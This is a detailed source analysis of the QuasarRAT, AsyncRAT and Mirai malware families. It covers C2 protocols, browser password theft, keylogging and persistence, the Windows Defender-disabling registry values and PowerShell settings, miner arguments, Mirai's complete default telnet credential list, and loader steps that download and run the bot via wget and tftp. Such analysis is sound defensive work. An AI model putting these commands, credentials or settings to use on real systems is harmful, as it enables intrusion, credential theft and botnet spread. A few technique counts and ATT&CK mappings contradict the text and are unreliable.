# Exhaustive Source Analysis: QuasarRAT, AsyncRAT, Mirai

## ═══════════════════════════════════════════════════════
## REPO 1: QuasarRAT (298 .cs files)
## ═══════════════════════════════════════════════════════

### ARCHITECTURE OVERVIEW
- **Language:** C# (.NET Framework)
- **Components:** Quasar.Client, Quasar.Server, Quasar.Common, Quasar.Common.Tests
- **Protocol:** Custom binary over TLS 1.2 SslStream
- **Serialization:** Custom binary serializer with type registry (TypeRegistry)
- **Message Pattern:** Request/Response message pairs via IMessage interface

---

### 1. CRYPTOGRAPHY

#### AES-256-CBC with HMAC-SHA256 (Quasar.Common/Cryptography/Aes256.cs)
- **Algorithm:** AES-256-CBC, PKCS7 padding
- **Key Derivation:** PBKDF2 (Rfc2898DeriveBytes) with 50000 iterations
- **Salt:** Static 32-byte hardcoded salt (0xBF,0xEB,0x1E...)
- **Auth:** HMAC-SHA256 over IV + ciphertext, stored as prefix
- **Format:** [HMAC:32][IV:16][CIPHERTEXT]
- **Key lengths:** AES key=32 bytes, Auth key=64 bytes
- **Uses:** Keylogger log file encryption, general message payload encryption
- Uses SafeComparison for timing-safe HMAC verification

#### SHA-256 (Quasar.Common/Cryptography/Sha256.cs)
- Standard SHA256 hash computation

#### Chromium Credential Decryption (Quasar.Client/Recovery/Browsers/ChromiumDecryptor.cs)
- Reads "encrypted_key" from Chrome Local State file
- DPAPI Unprotect to extract master key
- Supports "v10" AES-GCM encrypted passwords (BouncyCastle GcmBlockCipher+AesEngine)
- AES-GCM parameters: 256-bit key, 128-bit MAC, 96-bit nonce
- Falls back to DPAPI Unprotect for older Chrome versions

#### Firefox Credential Decryption (Quasar.Client/Recovery/Browsers/FFDecryptor.cs)
- Uses Firefox NSS libraries (nss3.dll) for 3DES decryption
- Custom decryption wrapper for stored credentials

---

### 2. NETWORK PROTOCOL

#### TLS Configuration (Quasar.Client/Networking/Client.cs)
- **Protocol:** SslStream with Tls12
- **Certificate Pinning:** Client validates server certificate by comparing with embedded X509Certificate2
- **Public key comparison:** Uses Equals() on certificates for pinning
- **Keep-alive:** TCP keepalive set to 25s interval, 25s time
- **Buffer size:** 16KB read buffer
- **Max message:** 5MB

#### Message Framing
- **Header:** 4-byte little-endian int32 payload length
- **Payload:** Binary serialized IMessage types
- **State machine:** Header -> Payload -> Header loop
- **Async pattern:** BeginRead/EndRead with ThreadPool processing queue

#### Connection Management
- Round-robin host rotation via HostsManager queue
- DNS resolution with IPv4 preference, IPv6 fallback
- Random reconnection delay: RECONNECTDELAY + 250-750ms jitter
- Hosts config supports IP addresses and domain names

#### Client Identification (Quasar.Client/Networking/QuasarClient.cs)
On connect, sends: Version, OS, AccountType, Country, CountryCode, ImageIndex, HardwareId, Username, PcName, Tag, EncryptionKey, Signature

---

### 3. PERSISTENCE MECHANISMS

#### Scheduled Task (Admin) (Quasar.Client/Setup/ClientStartup.cs)
- Command: `schtasks /create /tn "STARTUPKEY" /sc ONLOGON /tr "INSTALLPATH" /rl HIGHEST /f`
- Uses Process.Start with hidden window, no shell execute

#### Registry Run Key (Non-Admin)
- Path: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Value name: STARTUPKEY
- Value data: executable path

#### Installation (Quasar.Client/Setup/ClientInstaller.cs)
- Creates target directory if not exists
- Kills existing process at destination path if locked
- File.Copy(Application.ExecutablePath, installPath)
- Sets hidden file attributes (HIDEFILE, HIDEINSTALLSUBDIRECTORY)
- Deletes zone identifier (FileHelper.DeleteZoneIdentifier)
- Launches installed copy via Process.Start with hidden window

#### Update (Quasar.Client/Setup/ClientUpdater.cs)
- Writes batch file to temp directory
- Batch: timeout, copy new file over old, restart
- Removes startup entries before update

#### Uninstall (Quasar.Client/Setup/ClientUninstaller.cs)
- Removes startup entries (schtasks + registry run key)
- Deletes keylogger log files (YYYY-MM-DD pattern)
- Creates batch file to delete own executable after exit

---

### 4. KEYLOGGING (Quasar.Client/Logging/Keylogger.cs)

#### Implementation
- Uses global mouse/keyboard hooks via Gma.System.MouseKeyHook library
- Tracks window title changes via NativeMethodsHelper.GetForegroundWindowTitle()
- HTML-formatted output with color-coded special keys
- Logs stored in encrypted files per date (yyyy-MM-dd)
- Buffer flushed to disk on timer interval
- Max log file size enforcement (rolls to new file with _1, _2 suffixes)
- Hidden log directory (FileAttributes.Directory | FileAttributes.Hidden)
- AES-256 encrypted using stored ENCRYPTIONKEY

#### Key Processing
- Three-event pipeline: KeyDown -> KeyPress -> KeyUp
- Modifier key tracking (Ctrl, Alt, Shift)
- Special key highlighting in HTML
- UTF-8 charset with Content-Type meta header

---

### 5. PASSWORD RECOVERY

#### Chromium Browsers (Chrome, Edge, Yandex, Opera, Brave, OperaGX)
- Reads Login Data SQLite database
- v10/v11 AES-GCM decryption (BouncyCastle)
- Older: DPAPI Unprotect
- Master key from Local State "encrypted_key" field
- DPAPI scope: CurrentUser

#### Firefox
- Reads signons.sqlite (SQLite) and logins.json
- NSS 3DES decryption via nss3.dll P/Invoke

#### FTP Clients
- **FileZilla:** sitemanager.xml, recentservers.xml - Base64 decoded passwords
- **WinSCP:** Registry-based recovery

#### Internet Explorer
- Registry-based credential extraction

---

### 6. REMOTE ACCESS CAPABILITIES

#### Remote Shell (Quasar.Client/IO/Shell.cs)
- Spawns cmd.exe with redirected stdin/stdout/stderr
- OEM code page detection for correct encoding
- UTF-8 conversion for transport
- Auto-recreates session on close
- Commands: DoShellExecute -> ExecuteCommand

#### Remote Desktop
- JPG compression codec (Quasar.Common/Video/Compression/JpgCompression.cs)
- UnsafeStreamCodec for fast screen capture
- Resolution negotiation

#### File Manager
- Directory listing, file upload/download
- Chunked file transfers (FileChunk messages)
- FileTransferRequest/FileTransferComplete/FileTransferCancel

#### Registry Editor
- Full registry browsing (5 root hives)
- Create/Delete/Rename keys and values
- Value type support: String, Binary, DWORD, MultiString, QWORD
- Hex editor control for binary values

#### Task Manager
- Process listing via WMI or Process.GetProcesses
- Process kill, start
- DoProcessEnd, DoProcessStart

#### TCP Connections Viewer
- Native API: GetExtendedTcpTable (iphlpapi.dll)
- Connection close via SetTcpEntry (TCP state = Delete_TCB)
- Admin-only for connection termination

#### Reverse Proxy
- Client-side ReverseProxyClient connects to internal targets
- Socks-style: Server->Client->Internal Network
- Bi-directional data relay

#### System Information
- Hardware ID generation
- Geo-location via http://ip-api.com/
- Account type detection (Admin/User)

---

### 7. EVASION TECHNIQUES

#### File Hiding
- FileAttributes.Hidden on install path
- Hidden directory attributes
- Zone identifier deletion

#### Anti-Debug
- Only in DEBUG mode: certificate validation disabled

#### Process Name Randomization
- Not explicitly randomizing (uses compiled name)

#### Mutex (SingleInstanceMutex.cs)
- Named mutex to prevent multiple instances

---

### 8. BUILD SYSTEM

#### Client Builder (Quasar.Server/Build/ClientBuilder.cs)
- Embeds settings as resources
- Certificate embedding
- Renamer tool for obfuscation

#### No-IP Dynamic DNS Updater (Quasar.Server/Utilities/NoIpUpdater.cs)
- Updates dynamic DNS hostname for C2

#### Certificate Management
- DummyCertificate model
- Self-signed cert generation

---

### 9. MESSAGE TYPES (Exhaustive List)

**Action Messages (Server->Client):**
- DoAskElevate, DoChangeRegistryValue, DoClientDisconnect, DoClientReconnect
- DoClientUninstall, DoCloseConnection, DoCreateRegistryKey, DoCreateRegistryValue
- DoDeleteRegistryKey, DoDeleteRegistryValue, DoKeyboardEvent, DoLoadRegistryKey
- DoMouseEvent, DoPathDelete, DoPathRename, DoProcessEnd, DoProcessStart
- DoProcessResponse, DoRenameRegistryKey, DoRenameRegistryValue
- DoShellExecute, DoShellExecuteResponse, DoShowMessageBox, DoShutdownAction
- DoStartupItemAdd, DoStartupItemRemove, DoVisitWebsite, DoWebcamStop
- FileTransferCancel, FileTransferChunk, FileTransferComplete, FileTransferRequest
- GetChangeRegistryValueResponse, GetConnections, GetCreateRegistryKeyResponse
- GetCreateRegistryValueResponse, GetDeleteRegistryKeyResponse, GetDeleteRegistryValueResponse
- GetDesktop, GetDesktopResponse, GetDirectory, GetDirectoryResponse
- GetDrives, GetDrivesResponse, GetKeyloggerLogsDirectory, GetKeyloggerLogsDirectoryResponse
- GetMonitors, GetMonitorsResponse, GetPasswords, GetPasswordsResponse
- GetProcesses, GetProcessesResponse, GetRegistryKeysResponse
- GetRenameRegistryKeyResponse, GetRenameRegistryValueResponse
- GetStartupItems, GetStartupItemsResponse, GetSystemInfo, GetSystemInfoResponse
- SetStatus, SetStatusFileManager, SetUserStatus

**Reverse Proxy Messages:**
- ReverseProxyConnect, ReverseProxyConnectResponse, ReverseProxyData, ReverseProxyDisconnect

---

## ═══════════════════════════════════════════════════════
## REPO 2: AsyncRAT (260 .cs files)
## ═══════════════════════════════════════════════════════

### ARCHITECTURE OVERVIEW
- **Language:** C# (.NET Framework)
- **Protocol:** Custom binary over TLS SslStream
- **Plugin Architecture:** Modular DLL plugins loaded at runtime
- **Serialization:** MessagePack (MsgPack) binary format
- **Components:** Client, Server, Plugins (10+ separate plugin DLLs)

---

### DIFFERENCES FROM QuasarRAT

#### 1. Plugin System Architecture
AsyncRAT uses a **dynamic plugin DLL loading system**:
- Each feature is a separate .NET DLL loaded at runtime
- Plugins inherit a common Plugin class with Run(Socket, certificate, hwid, msgPack, mutex, ...) interface
- Plugins establish their own TLS connection to server
- Plugin list: Recovery, RemoteDesktop, RemoteCamera, FileManager, FileSearcher, ProcessManager, Miscellaneous, Options, LimeLogger, Extra, Chat, SendFile, SendMemory

#### 2. MessagePack Serialization
- Uses MessagePack (MsgPack) instead of custom binary serializer
- Server component: Server/MessagePack/MsgPack.cs, ReadTools.cs, WriteTools.cs
- Client component: MessagePack/MessagePack/MsgPack.cs
- Zip decompression integrated: MessagePack/Zip.cs

#### 3. Crypto (Identical to QuasarRAT)
- Server/Algorithm/Aes256.cs - **IDENTICAL implementation**
- Same AES-256-CBC + HMAC-SHA256
- Same PBKDF2 with 50000 iterations
- Same static salt
- Same wire format [HMAC:32][IV:16][CIPHERTEXT]

#### 4. Hash Algorithm
- Server/Algorithm/Sha256.cs - SHA256 implementation
- Server/Algorithm/GetHash.cs - Hash computation utilities

---

### PERSISTENCE MECHANISMS

#### NormalStartup.cs (Client/Install/NormalStartup.cs)
- **Admin path:** schtasks via `cmd /c schtasks /create /f /sc onlogon /rl highest /tn "name" /tr "'"path"'" & exit`
- Uses ProcessStartInfo with hidden window
- Reversed registry path obfuscation: `Strings.StrReverse(@"\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS")` = `Software\Microsoft\Windows\CurrentVersion\Run`
- **Non-admin path:** Registry Run key under HKCU
- Installation copies executable bytes to install path
- Creates batch file for cleanup/relaunch: timeout 3, START, CD temp, DEL batch
- Kills existing process at install path
- Calls Environment.Exit(0) after batch execution

---

### ANTI-ANALYSIS (Client/Helper/Anti_Analysis.cs)

- **VM Detection:** WMI query `Win32_ComputerSystem` - checks for:
  - Manufacturer = "microsoft corporation" AND Model contains "VIRTUAL"
  - Manufacturer contains "vmware"
  - Model = "VirtualBox"
- **Debugger Detection:** NativeMethods.CheckRemoteDebuggerPresent
- **Sandboxie Detection:** GetModuleHandle("SbieDll.dll")
- **Disk Size Check:** TotalSize <= 60GB (small disk = VM)
- **XP Detection:** OSFullName contains "xp"
- Kills process via Environment.FailFast(null) if any check positive

---

### PROCESS CRITICAL / BSOD PROTECTION (Client/Helper/ProcessCritical.cs)

- Calls `RtlSetProcessIsCritical(1, 0, 0)` via NativeMethods (ntdll.dll)
- If process is terminated, causes BSOD
- On session ending, calls RtlSetProcessIsCritical(0) to disable
- Fallback: infinite sleep loop if disable fails (prevents BSOD)

---

### C2 CONNECTION (Client/Connection/ClientSocket.cs)

- **TLS:** SslStream with SslProtocols.Tls (not Tls12)
- **Certificate pinning:** Settings.ServerCertificate.Equals(certificate)
- **Pastebin fallback:** Dynamic C2 via pastebin URL (download string, parse host:port)
- **Multi-host:** Settings.Hosts/PORTS comma-separated, random selection
- **Keep-alive:** Timer sends MsgPack ping with active window title
- **Ping measurement:** Interval tracking for round-trip time
- **Chunked sends:** For messages > 1MB, split into 50KB chunks
- **Header format:** 4-byte int length prefix

---

### MINER INTEGRATION (Plugin/SendMemory/SendMemory/Handler/HandleMiner.cs)

- **Miner:** XMRig (Monero) integrated
- **Algorithm:** cn/r (CryptoNight R)
- **Injection:** RunPE.Run() injects miner into another process (e.g., RegSvcs.exe)
- **Commands:** stop, run, save (save binary then run)
- **Args:** `-B --donate-level=1 -t {cores/2} -v 0 --cpu-priority=3 -a cn/r -k -o {pool} -u {wallet} -p {pass}`
- **Detection kill:** Searches process command lines for "--donate-level=" via WMI
- **Persistence:** SetRegistry.SetValue(Hwid, "1") to track miner state

---

### KEYLOGGING (Plugin/LimeLogger/LimeLogger/Plugin.cs)

- Separate plugin DLL loaded at runtime
- Uses same global hook approach as QuasarRAT
- HTML formatted output
- Encrypted storage

---

### WINDOWS DEFENDER DISABLING (Plugin/Extra/Extra/Handler/HandleDisableDefender.cs)

#### Registry Disable:
```
HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable = 1
```

#### PowerShell Commands (via Set-MpPreference):
- DisableRealtimeMonitoring, DisableBehaviorMonitoring, DisableBlockAtFirstSeen
- DisableIOAVProtection, DisablePrivacyMode, SignatureDisableUpdateOnStartupWithoutEngine
- DisableArchiveScanning, DisableIntrusionPreventionSystem, DisableScriptScanning
- SubmitSamplesConsent = 2 (Never send), MAPSReporting = 0 (Disabled)
- HighThreatDefaultAction = 6 (Allow), ModerateThreatDefaultAction = 6, LowThreatDefaultAction = 6, SevereThreatDefaultAction = 6

#### Verification:
- Runs `Get-MpPreference -verbose` via PowerShell
- Checks each setting and applies fix if still False

---

### OTHER EVASION

#### HandleBlankScreen.cs
- Creates new Windows desktop via CreateDesktop API
- Switches user to blank desktop (SwitchDesktop)
- Can revert to original desktop

#### HandleBotKiller.cs
- Scans all processes in CommonApplicationData and UserProfile
- Kills processes with invisible windows that match suspicious paths
- Removes from Run/RunOnce registry keys (HKCU + HKLM)
- Reports kill count back to server

#### HandleUAC.cs
- Restarts self with "runas" verb for UAC elevation
- `cmd /k START "" "path" & EXIT`

#### HandleDisableDefender.cs
- Full Windows Defender bypass as detailed above

---

### OBFUSCATION SYSTEM (Server/RenamingObfuscation/)

- **Classes:** ClassesRenaming, FieldsRenaming, MethodsRenaming, PropertiesRenaming, NamespacesRenaming
- **Crypto:** Base64 encoding (Base64.cs), DecryptionHelper
- **Injection:** InjectHelper for payload injection
- **Interfaces:** IRenaming, ICrypto

---

### RECOVERY PLUGIN (Plugin/Recovery/Recovery/)

#### Chromium Browsers (28+ browsers targeted)
Paths checked:
- Chrome, Opera, Yandex, 360 Browser, Comodo Dragon, CoolNovo, SRWare Iron
- Torch, Brave, Iridium, 7Star, Amigo, CentBrowser, Chedot, CocCoc
- Elements Browser, Epic Privacy Browser, Kometa, Orbitum, Sputnik
- uCozMedia, Vivaldi, Sleipnir 6, Citrio, Coowon, Liebao, QIP Surf, Edge Chromium

Decryption methods:
- v10/v11: AES-GCM with master key from Local State
- Older: DPAPI Unprotect
- SQLite database parsing: origin_url, username_value, password_value

#### Firefox
- Cookies and credentials via FFDecryptor
- NSS decryption

---

### MESSAGE TYPES (AsyncRAT)

Packets include: Ping, Pong, Logs, Shell, FileManager, Recovery, Miner, RemoteDesktop, Webcam, ProcessManager, FileSearcher, Keylogger, Chat, Thumbnails, ReportWindow, Torrent, Dos, BotKiller, SendMemory, Options, UAC, DisableDefender, BlankScreen, Wallpaper

---

## ═══════════════════════════════════════════════════════
## REPO 3: Mirai (25 .c + 9 .go + 16 .h = 50 files)
## ═══════════════════════════════════════════════════════

### ARCHITECTURE OVERVIEW
- **Language:** C (bot/loader) + Go (CNC)
- **Components:** Bot (C malware), Loader (C telnet brute + payload delivery), CNC (Go command server), DLR (C downloader stub)
- **Protocol:** Raw TCP binary with uint16 length prefix
- **Compilation:** Cross-compiled for multiple architectures (arm, mips, x86, m68k, ppc, sh4, spc)

---

### 1. ENCRYPTION / OBFUSCATION

#### Table XOR Obfuscation (mirai/bot/table.c)
- **XOR Key:** 0xdeadbeef
- **Algorithm:** 4-byte XOR (k1=0xef, k2=0xbe, k3=0xad, k4=0xde)
- All strings XOR'd at rest, toggled before/after use via table_unlock_val / table_lock_val
- **Known strings:** CNC domain/port, scan callback, process paths, attack headers, HTTP user agents, shell commands

#### Anti-Debug Entry Point
- Main function resolves CNC address only via anti_gdb_entry() signal handler (SIGTRAP)
- On SIGTRAP: resolve_func = resolve_cnc_addr (changes from local address to real CNC)
- If process is attached to debugger, SIGTRAP is intercepted and anti_gdb_entry never called

---

### 2. CNC PROTOCOL

#### Connection (mirai/bot/main.c)
- **Handshake:** Bot sends `\x00\x00\x00\x01` + id_len + id_buf to CNC
- **Keep-alive:** Bot sends 2-byte zero-length packet every 6 pings
- **Message format:** uint16 length (network byte order) + payload
- **Attack commands:** attack_parse() processes incoming attack payloads

#### CNC Server (mirai/cnc/main.go)
- Listens on tcp/23 (bot connections) and tcp/101 (API)
- Bot identification: reads initial 4 bytes (must be 0x00 0x00 0x00 + version byte)
- Admin authentication: MySQL database, Russian-language prompts
- API: pipe-delimited format (apikey|command)
- MySQL backend: users table with max_bots, admin, duration_limit, cooldown

---

### 3. ATTACK VECTORS (9 methods)

#### TCP Attacks (mirai/bot/attack_tcp.c)
1. **SYN Flood (ATK_VEC_SYN):** Raw socket, IP_HDRINCL, TCP SYN with MSS/SACK/TSVAL/WSS options
2. **ACK Flood (ATK_VEC_ACK):** Raw socket, TCP ACK with randomized payload (default 512 bytes)
3. **STOMP Flood (ATK_VEC_STOMP):** Advanced: connects to target, captures SYN+ACK seq/ack numbers, then floods with legitimate sequence numbers

#### UDP Attacks (mirai/bot/attack_udp.c)
4. **UDP Generic (ATK_VEC_UDP):** Raw socket, randomized payload, randomizable src/dst ports
5. **UDP VSE (ATK_VEC_VSE):** Valve Source Engine flood targeting port 27015, TSource Engine Query payload (0xFFFFFFFF + VSE payload)
6. **DNS (ATK_VEC_DNS):** DNS amplification - sends DNS queries to system resolver targeting port 53, reads /etc/resolv.conf for nameserver
7. **UDP Plain (ATK_VEC_UDP_PLAIN):** Connected UDP sockets, optimized for higher PPS

#### GRE Attacks (mirai/bot/attack_gre.c)
8. **GRE IP (ATK_VEC_GREIP):** IP-over-GRE encapsulation with inner UDP payload
9. **GRE Ethernet (ATK_VEC_GREETH):** Ethernet-over-GRE with randomized MAC addresses

#### HTTP Attack (mirai/bot/attack_app.c)
10. **HTTP Flood (ATK_VEC_HTTP):** Layer 7 flood with:
    - Random User-Agent rotation (5 different UA strings)
    - Cookie handling (parses Set-Cookie, maintains session)
    - Keep-alive support
    - POST data support
    - CloudFlare/DOSArrest detection (protection_type tracking)
    - Chunked transfer encoding handling
    - Connection pooling up to HTTP_CONNECTION_MAX

---

### 4. ATTACK PROTOCOL (mirai/bot/attack.c)

#### Binary Payload Format:
```
[4 bytes: duration (network order)]
[1 byte: attack vector ID]
[1 byte: target count]
[For each target: 4 bytes IP + 1 byte netmask]
[1 byte: option count]
[For each option: 1 byte key + 1 byte val_len + val_len bytes value]
```

#### Attack Options (Flag IDs):
- 0: len (payload size, default 512)
- 1: rand (randomize data, default yes)
- 2: tos (IP TOS field)
- 3: ident (IP ID field)
- 4: ttl (IP TTL, default 255)
- 5: df (Don't Fragment)
- 6: sport (source port)
- 7: dport (destination port)
- 8: domain (DNS/HTTP target domain)
- 9: dhid (DNS header ID)
- 11: urg, 12: ack, 13: psh, 14: rst, 15: syn, 16: fin
- 17: seqnum, 18: acknum
- 19: gcip (GRE constant IP)
- 20: method (HTTP method)
- 21: postdata (POST data)
- 22: path (HTTP path)
- 24: conns (HTTP connections)
- 25: source (spoofed source IP)

---

### 5. SCANNER (mirai/bot/scanner.c)

#### Raw Socket SYN Scanning
- Uses `socket(AF_INET, SOCK_RAW, IPPROTO_TCP)` with IP_HDRINCL
- Custom IP/TCP header construction in scanner_rawpkt buffer
- TCP SYN to port 23 (90%) and port 2323 (10%)
- Source port > 1024 (randomized)
- IP ID randomized, TTL=64, SEQ = destination IP
- Checksum computed via checksum_generic / checksum_tcpudp
- Rate: SCANNER_RAW_PPS packets per second

#### State Machine (telnet brute):
1. SC_CLOSED -> SC_CONNECTING (connect to SYN+ACK responder)
2. SC_CONNECTING -> SC_HANDLE_IACS (connection established, allocate auth entry)
3. SC_HANDLE_IACS -> SC_WAITING_USERNAME (telnet negotiation complete)
4. SC_WAITING_USERNAME -> SC_WAITING_PASSWORD (send username\r\n)
5. SC_WAITING_PASSWORD -> SC_WAITING_PASSWD_RESP (send password\r\n)
6. SC_WAITING_PASSWD_RESP -> SC_WAITING_SHELL (enable/system/shell/sh)
7. SC_WAITING_SHELL -> SC_DETECT (check for BusyBox)
8. SC_DETECT -> report to CNC callback

#### Connection Management
- Max concurrent connections: SCANNER_MAX_CONNS
- Connection timeout: 30s (connected), 5s (connecting)
- Retry: up to 10 attempts with different credentials per IP
- Telnet IAC negotiation handling (WILL/WONT/DO/DONT)

---

### 6. FULL CREDENTIAL LIST (62 entries)

```
root:xc3511          root:vizxv          root:admin          admin:admin
root:888888          root:xmhdipc        root:default        root:juantech
root:123456          root:54321          support:support     root:(none)
admin:password       root:root           root:12345          user:user
admin:(none)         root:pass           admin:admin1234     root:1111
admin:smcadmin       admin:1111          root:666666         root:password
root:1234            root:klv123         Administrator:admin  service:service
supervisor:supervisor guest:guest        guest:12345         admin1:password
administrator:1234   666666:666666       888888:888888       ubnt:ubnt
root:klv1234         root:Zte521         root:hi3518         root:jvbzd
root:anko            root:zlxx.          root:7ujMko0vizxv    root:7ujMko0admin
root:system          root:ikwb           root:dreambox       root:user
root:realtek         root:00000000       admin:1111111       admin:1234
admin:12345          admin:54321         admin:123456        admin:7ujMko0admin
admin:1234           admin:pass          admin:meinsm        tech:tech
mother:fucker
```

---

### 7. KILLER MODULE (mirai/bot/killer.c)

#### Port Binding (monopolization):
- Kills processes on tcp/23 (telnet), tcp/22 (SSH), tcp/80 (HTTP)
- Binds to these ports to prevent services from restarting
- Compile-time defines: KILLER_REBIND_TELNET, KILLER_REBIND_SSH, KILLER_REBIND_HTTP

#### Process Killing (/proc walking):
- Iterates /proc/[pid]/ directory
- Skips PIDs <= KILLER_MIN_PID or previously scanned PIDs
- For each process:
  - Reads /proc/$pid/exe via readlink to get binary path
  - Kills if path contains ".anime" (competitor marker)
  - Kills if binary file is deleted (open fails)
  - Memory scan: reads /proc/$pid/exe and searches for competitor signatures
- Competitor signatures (from table):
  - TABLE_MEM_QBOT (QBot report string)
  - TABLE_MEM_QBOT2 (QBot HTTP string)
  - TABLE_MEM_QBOT3 (QBot duplicate)
  - TABLE_MEM_UPX (UPX packed binary strings)
  - TABLE_MEM_ZOLLARD (Zollard)
  - TABLE_MEM_REMAITEN (Remaiten)

#### Port-Based Killing:
- Reads /proc/net/tcp to find listening socket inode
- Iterates /proc/$pid/fd/ to find process holding that socket
- Kills process by PID

#### Single Instance Enforcement:
- Binds to control port (SINGLE_INSTANCE_PORT) on 127.0.0.1
- If bind fails, connects to existing instance (triggers accept -> kill)
- Falls back to killer_kill_by_port if connect fails

#### Self-Protection:
- Stores own realpath via /proc/self/exe
- Deletes own binary (unlink(argv[0]))
- Hides argv[0] with random alphastr (12-24 chars)
- Hides process name via prctl(PR_SET_NAME) with random name (12-36 chars)
- Forks to background, setsid, closes STDIN/STDOUT/STDERR
- Disables /dev/watchdog (ioctl with magic 0x80045704)
- Blocks SIGINT, ignores SIGCHLD

---

### 8. LOADER (loader/)

#### Architecture
- **C-based:** Multi-threaded epoll-driven loader
- **Input:** Reads from stdin (format: ip:port user:pass arch)
- **Workers:** One worker thread per CPU core, each with own epoll context
- **CPU affinity:** pthread_setaffinity_np binds workers to specific cores

#### Payload Delivery State Machine (loader/src/server.c):
1. TELNET_CONNECTING -> TELNET_READ_IACS
2. TELNET_READ_IACS -> TELNET_USER_PROMPT (telnet negotiation)
3. TELNET_USER_PROMPT -> TELNET_PASS_PROMPT (send user)
4. TELNET_PASS_PROMPT -> TELNET_WAITPASS_PROMPT (send password)
5. TELNET_WAITPASS_PROMPT -> TELNET_CHECK_LOGIN (enable/shell/sh)
6. TELNET_CHECK_LOGIN -> TELNET_VERIFY_LOGIN (echo token query)
7. TELNET_VERIFY_LOGIN -> TELNET_PARSE_PS (/bin/busybox ps)
8. TELNET_PARSE_PS -> TELNET_PARSE_MOUNTS (/bin/busybox cat /proc/mounts)
9. TELNET_PARSE_MOUNTS -> TELNET_READ_WRITEABLE (find rw directory)
10. TELNET_READ_WRITEABLE -> TELNET_COPY_ECHO (cp /bin/echo, chmod)
11. TELNET_COPY_ECHO -> TELNET_DETECT_ARCH (cat /bin/echo to read ELF header)
12. TELNET_DETECT_ARCH -> TELNET_ARM_SUBTYPE (cat /proc/cpuinfo for ARMv7)
13. TELNET_ARM_SUBTYPE -> TELNET_UPLOAD_METHODS (check wget/tftp availability)
14. TELNET_UPLOAD_METHODS -> TELNET_UPLOAD_ECHO/WGET/TFTP
15. TELNET_UPLOAD -> TELNET_RUN_BINARY (./binary arch.id)
16. TELNET_RUN_BINARY -> Success/Close

#### Three Upload Methods:
1. **ECHO:** Converts binary to hex escape sequences, echoes to file on device
2. **WGET:** Downloads from HTTP server (http://wget_server/bins/mirai.arch)
3. **TFTP:** Downloads via TFTP (tftp -g -l binary -r mirai.arch tftp_server)

#### Architecture Detection (ELF parsing):
- Reads ELF header from /bin/echo
- Endianness detection: EE_BIG/EE_LITTLE
- Machine type: EM_ARM, EM_AARCH64, EM_MIPS, EM_MIPS_RS3_LE, EM_386, EM_486, EM_68K, EM_PPC, EM_SH4
- ARM sub-type: reads /proc/cpuinfo for ARMv7 detection

#### Process Killing (during PS parsing):
- Kills second "init" process (pid != 1)
- Kills suspicious processes with numeric names and pid > 400

---

### 9. DLR (Downloader Stub) (dlr/main.c)

#### Minimal HTTP Downloader
- Uses raw syscalls (no libc dependency)
- Compatible with multiple architectures (ARM OABI/EABI, MIPS, x86)
- Connections: TCP to HTTP_SERVER on port 80
- Download: GET /bins/mirai.{BOT_ARCH} HTTP/1.0
- Writes to: dvrHelper (the Mirai bot binary)
- Outputs: "MIRAI\n" on execution, "FIN\n" on download completion
- syscall stubs: socket, connect, read, write, open, close, exit
- Uses socketcall for architectures that need it

---

### 10. TOOLS

#### enc.c - XOR String Encoder
- XOR key: 0xdeadbeef
- Encodes strings into \\xHH format for table.c inclusion
- Types: string, ip, uint32, uint16, uint8, bool

#### scanListen.go - Scan Result Listener
- Listens for scan results from bots

#### single_load.c / badbot.c / nogdb.c / wget.c
- Support tools for loading and testing

---

### 11. CNC DATABASE SCHEMA

```sql
users: username, password, max_bots, admin, api_key, last_paid, cooldown, duration_limit, wrc, intvl
history: user_id, time_sent, duration, command, max_bots
whitelist: prefix, netmask
```

---

### 12. SUMMARY OF ALL TECHNIQUES BY MITRE ATT&CK

| Technique | QuasarRAT | AsyncRAT | Mirai |
|-----------|-----------|----------|-------|
| T1071.001 - Web Protocols | - | - | HTTP flood attack |
| T1090 - Proxy | ReverseProxy | ReverseProxy | - |
| T1547.001 - Registry Run Keys | ✓ | ✓ | - |
| T1053.005 - Scheduled Task | ✓ | ✓ | - |
| T1056.001 - Keylogging | ✓ (Hook-based) | ✓ (Hook-based) | - |
| T1003 - Credential Dumping | ✓ (Browser/FTP) | ✓ (28+ browsers) | - |
| T1140 - Deobfuscate/Decode | X-OR table | Base64 obfusc | XOR table |
| T1497.001 - System Checks | - | ✓ (VM/sandbox) | - |
| T1562.001 - Disable Tools | - | ✓ (Defender) | ✓ (Killer) |
| T1573.001 - Symmetric Crypto | AES-256-CBC | AES-256-CBC | XOR (0xdeadbeef) |
| T1573.002 - Asymmetric Crypto | RSA cert pinning | RSA cert pinning | - |
| T1571 - Non-Standard Port | Any port | Any port | TCP/23, 101 |
| T1498 - Network DoS | - | DoS module | 9 attack vectors |
| T1499 - Endpoint DoS | - | - | Resource exhaust |
| T1564.001 - Hidden Files | ✓ | ✓ | ✓ |
| T1070.004 - File Deletion | Uninstall batch | Batch self-delete | unlink(argv[0]) |
| T1036.005 - Match Legitimate | Random process name | - | prctl(PR_SET_NAME) |
| T1095 - Non-Application Protocol | Binary protocol | MessagePack | Binary protocol |
| T1132.001 - Standard Encoding | Binary serial | MessagePack | Network byte order |
| T1574.002 - DLL Side-Loading | - | RunPE injection | - |
| T1055.012 - Process Hollowing | - | XMRig injection | - |
| T1548.002 - Bypass UAC | AskElevate | runas verb | - |
| T1562.004 - Disable Sys Svcs | - | - | /dev/watchdog |
| T1529 - System Shutdown | DoShutdownAction | - | BSOD (critical) |
